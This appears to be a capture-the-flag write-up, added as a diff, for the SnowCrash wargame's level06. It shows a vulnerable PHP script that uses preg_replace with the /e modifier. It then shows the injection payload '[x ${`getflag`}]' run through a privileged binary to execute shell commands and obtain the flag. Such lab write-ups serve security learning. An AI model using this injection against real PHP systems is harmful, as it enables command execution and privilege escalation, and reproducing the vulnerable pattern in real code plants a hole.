@@ -1,0 +1,29 @@
+I found two files, level06 which is an executable, and level06.php which is a php file that belongs to the user flag06
+
+after decoding the binary (level06) we found that it actually executed the php file with escalated privileges and passes 2 arguments to it
+we used the website: https://dogbolt.org/
+
+so we had to take a look at the php file
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+and after understanding what the code does, we noticed something weird specifically the part
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+and in PHP, the /e modifier in a preg_replace function is used to evaluate the replacement string as PHP code. This means that whatever string is used as the replacement will be treated as PHP code and executed.
+so we started playing with the input and trying to pass the regex where we ended up trying this
+
+level06@SnowCrash:~$ echo '[x ${`ls`}]' > /tmp/test && ./level06 /tmp/test ''
+PHP Notice:  Undefined variable: level06
+level06.php
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+as the other part (${`ls`}) will be evaluated as code
+
+so if I try to add getflag command instead
+level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test && ./level06 /tmp/test ''
+PHP Notice:  Undefined variable: Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXX
+ in /home/user/level06/level06.php(4) : regexp code on line 1
